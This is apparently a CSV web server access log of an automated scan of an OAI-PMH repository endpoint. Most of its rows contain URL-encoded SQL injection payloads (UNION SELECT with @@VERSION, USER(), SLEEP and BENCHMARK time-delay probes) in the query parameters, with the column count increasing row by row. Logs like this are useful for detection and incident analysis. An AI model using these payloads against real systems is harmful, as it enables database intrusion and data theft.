uuid,timestamp,http_status_code,request_url,response_time,http_version
a14acdb4-f432-4029-ae79-5f4c587c968c,2025-01-28 08:53:21,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%23&until=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%23,83.86 ms,HTTP/1.1
96b74587-7b7e-4086-b7a1-81abbe3ad4b3,2025-01-28 08:53:21,200,http://islandora.io/oai/request?verb=GetRecord&identifier=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%23&metadataPrefix=oai_dc,79.90 ms,HTTP/1.1
226e6687-c472-4916-9768-c9c8dd54a3e1,2025-01-28 08:53:21,200,http://islandora.io/oai/request?verb=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%23,56.21 ms,HTTP/1.1
c3dc6b32-54fb-401c-8220-e2bbeeaf653f,2025-01-28 08:53:22,200,http://islandora.io/oai/request?verb=ListMetadataFormats,53.70 ms,HTTP/1.1
dd0dfe5d-de28-4121-9e74-9f7061eae9eb,2025-01-28 08:53:22,200,http://islandora.io/oai/request?verb=ListSets,54.16 ms,HTTP/1.1
89b9d9e3-f12e-4a2a-aff3-eb301379e66d,2025-01-28 08:53:23,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%23&until=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%23,65.96 ms,HTTP/1.1
9779ed86-567c-4e2f-93e4-1f0ae601a88d,2025-01-28 08:53:23,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%23&set=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%23,64.65 ms,HTTP/1.1
06f97b9a-4d90-4e70-b2e9-1928b60a6bae,2025-01-28 08:53:23,200,http://islandora.io/oai/request?verb=GetRecord&identifier=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%23&metadataPrefix=oai_dc,50.61 ms,HTTP/1.1
a2e60ec3-4ad2-46fa-aefb-041fa77dcad2,2025-01-28 08:53:24,200,http://islandora.io/oai/request?verb=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%23,46.37 ms,HTTP/1.1
bcdcab0f-5641-44ab-890f-6a112138c6d7,2025-01-28 08:53:24,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%23,41.61 ms,HTTP/1.1
5f788441-8b69-49d9-8613-b69d929747fc,2025-01-28 08:53:24,200,http://islandora.io/oai/request?verb=ListSets,58.16 ms,HTTP/1.1
417c3f90-a800-4edf-81bc-c9b05d2ff5b7,2025-01-28 08:53:25,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%23,32.12 ms,HTTP/1.1
25438c8d-c84b-47be-a078-b526e47e2e54,2025-01-28 08:53:25,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%23&set=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%23,71.98 ms,HTTP/1.1
8a6c1f91-7486-4b6b-bbbe-932c639f46ec,2025-01-28 08:53:25,200,http://islandora.io/oai/request?verb=GetRecord&identifier=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%23&metadataPrefix=oai_dc,60.36 ms,HTTP/1.1
42e4951a-2ab5-4266-9b0b-84a76421fd66,2025-01-28 08:53:26,200,http://islandora.io/oai/request?verb=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%23,65.68 ms,HTTP/1.1
a248ad2e-fa73-41e4-888f-ded77f742a33,2025-01-28 08:53:26,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%23,73.00 ms,HTTP/1.1
fb77e45a-8aaf-4c48-8493-1dc394061dd3,2025-01-28 08:53:26,200,http://islandora.io/oai/request?verb=ListSets,33.25 ms,HTTP/1.1
fa3dbad0-48e6-45eb-8d4f-5fe726ba14ea,2025-01-28 08:53:27,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc,61.16 ms,HTTP/1.1
9e3cece5-cc9a-4555-aa69-6e16779955c5,2025-01-28 08:53:27,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&until=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%23&set=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%23,53.43 ms,HTTP/1.1
a5e2c274-4eb1-461c-8a8e-458f6dc94f2b,2025-01-28 08:53:27,200,http://islandora.io/oai/request?verb=GetRecord&identifier=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%23&metadataPrefix=marc,55.09 ms,HTTP/1.1
2a7166cd-2d96-4467-88b3-43819d0a0279,2025-01-28 08:53:28,200,http://islandora.io/oai/request?verb=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%23,67.45 ms,HTTP/1.1
d1e8b1d3-e2a9-4f19-90e7-72b24206016f,2025-01-28 08:53:28,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%23,68.57 ms,HTTP/1.1
94a66994-8746-4450-b064-737d320fda35,2025-01-28 08:53:28,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%23,55.62 ms,HTTP/1.1
4509ee0b-432b-43aa-ae63-965e14ef2485,2025-01-28 08:53:29,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%23,58.51 ms,HTTP/1.1
ffb35adf-657d-45bc-85d9-bb909cd1cab6,2025-01-28 08:53:29,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%23&set=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%23,59.88 ms,HTTP/1.1
e949822f-3e22-4f7e-a739-ba6c0d68c621,2025-01-28 08:53:29,200,http://islandora.io/oai/request?verb=GetRecord&identifier=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%23&metadataPrefix=marc,47.54 ms,HTTP/1.1
8c0776a7-f747-4fd0-9611-319d6c095b1d,2025-01-28 08:53:30,200,http://islandora.io/oai/request?verb=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%23,64.25 ms,HTTP/1.1
d2b56644-995a-4c5d-a723-37b06af96172,2025-01-28 08:53:30,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%23,49.54 ms,HTTP/1.1
911c38ba-c94f-4c42-a19b-6344d4f7f59e,2025-01-28 08:53:31,200,http://islandora.io/oai/request?verb=ListSets,52.13 ms,HTTP/1.1
71a4ae8c-c57a-4d77-993c-21f8913560a7,2025-01-28 08:53:31,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%23&set=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%23,66.67 ms,HTTP/1.1
85b9f997-dd5e-4922-928c-7439044e5882,2025-01-28 08:53:31,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%23&set=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%23,35.54 ms,HTTP/1.1
ac161759-5b8a-4526-a8fe-32869556479b,2025-01-28 08:53:32,200,http://islandora.io/oai/request?verb=GetRecord&identifier=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%23&metadataPrefix=marc,52.62 ms,HTTP/1.1
864a3ee4-89a6-4bcc-84ef-51e852278652,2025-01-28 08:53:32,200,http://islandora.io/oai/request?verb=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%23,62.07 ms,HTTP/1.1
bfd53819-d46c-4227-b7b6-e7e075dc62ea,2025-01-28 08:53:32,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%23,58.02 ms,HTTP/1.1
47eb629b-643f-4f02-a9b1-67402e1fad01,2025-01-28 08:53:33,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%23,55.62 ms,HTTP/1.1
8fa30371-a878-416d-b470-9813ce25a92f,2025-01-28 08:53:33,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%23&set=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%23,70.09 ms,HTTP/1.1
c5655f42-26b9-444c-a3ad-f403e5667d54,2025-01-28 08:53:33,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc,134.77 ms,HTTP/1.1
8702375f-cef0-4037-8ba4-a38f1906ef66,2025-01-28 08:53:34,200,http://islandora.io/oai/request?verb=GetRecord&identifier=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%23&metadataPrefix=marc,30.10 ms,HTTP/1.1
9e781a35-9e32-4715-af9b-04f932cb3037,2025-01-28 08:53:34,200,http://islandora.io/oai/request?verb=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%23,56.66 ms,HTTP/1.1
7d19ea2c-f477-44ce-96de-0773434cf8f4,2025-01-28 08:53:34,200,http://islandora.io/oai/request?verb=ListMetadataFormats,46.36 ms,HTTP/1.1
81f0d902-5a09-404e-8e44-815671b52ec0,2025-01-28 08:53:35,200,http://islandora.io/oai/request?verb=ListSets,39.71 ms,HTTP/1.1
4ea4d3f3-51e8-4aeb-8f8f-bf3b158caef6,2025-01-28 08:53:35,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%23&set=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%23,57.78 ms,HTTP/1.1
643240c8-fa2a-4150-92b1-b446c1311e2a,2025-01-28 08:53:35,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%23,47.37 ms,HTTP/1.1
fcf8df02-ad37-4ea6-88a6-df04d946fea7,2025-01-28 08:53:36,200,http://islandora.io/oai/request?verb=GetRecord&identifier=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%23&metadataPrefix=oai_dc,87.08 ms,HTTP/1.1
c1c3021b-7d18-4890-a26d-9bed7d14e610,2025-01-28 08:53:36,200,http://islandora.io/oai/request?verb=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%23,44.31 ms,HTTP/1.1
0dc090fc-f5d1-49d1-8fd2-1da87506325c,2025-01-28 08:53:37,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%23,52.49 ms,HTTP/1.1
22af7ab0-441b-42c7-862d-94a4964a8beb,2025-01-28 08:53:37,200,http://islandora.io/oai/request?verb=ListSets,27.77 ms,HTTP/1.1
3f0846a3-e09a-4698-ae84-ee2dc9931a95,2025-01-28 08:53:37,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc,43.42 ms,HTTP/1.1
dfc9a5ce-c49e-49e4-8a1e-cd1784f182cd,2025-01-28 08:53:38,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%23&until=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%23&set=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%23,32.84 ms,HTTP/1.1
48e7b413-0ca8-4de9-b987-87d701698441,2025-01-28 08:53:38,200,http://islandora.io/oai/request?verb=GetRecord&identifier=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%23&metadataPrefix=marc,41.10 ms,HTTP/1.1
6567889b-2d1d-4c1b-96cf-6b073eb2f9db,2025-01-28 08:53:38,200,http://islandora.io/oai/request?verb=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%23,56.76 ms,HTTP/1.1
0e51beb1-4684-43e8-857e-341e56c729ab,2025-01-28 08:53:39,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%23,63.00 ms,HTTP/1.1
0eb0caff-66ec-4670-9a0d-a80d29a43640,2025-01-28 08:53:39,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%23,92.80 ms,HTTP/1.1
958b86a0-71e8-4cae-a8b7-58f8d61438d6,2025-01-28 08:53:39,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%23&set=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%23,72.05 ms,HTTP/1.1
5056d836-7bbb-4080-9191-cd408c96c959,2025-01-28 08:53:40,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&set=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%23,63.15 ms,HTTP/1.1
da15ea24-ae62-490d-ae23-3b34d4c78b56,2025-01-28 08:53:40,200,http://islandora.io/oai/request?verb=GetRecord&identifier=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%23&metadataPrefix=oai_dc,98.18 ms,HTTP/1.1
051d9193-88eb-4ecc-ae80-ced1b63c63f7,2025-01-28 08:53:40,200,http://islandora.io/oai/request?verb=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%23,56.66 ms,HTTP/1.1
d4d1798f-4c36-4d01-a2a3-1d18db6e0735,2025-01-28 08:53:41,200,http://islandora.io/oai/request?verb=ListMetadataFormats,56.01 ms,HTTP/1.1
b4f432ad-ce20-4f9d-bfcb-af8f89ce0e3b,2025-01-28 08:53:41,200,http://islandora.io/oai/request?verb=ListSets,41.38 ms,HTTP/1.1
1ad26884-5658-44cf-87c6-fd78d5989642,2025-01-28 08:53:41,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc,78.03 ms,HTTP/1.1
be18a2ac-b646-4857-ae0a-27f177cab0b8,2025-01-28 08:53:42,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%23&set=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%23,36.83 ms,HTTP/1.1
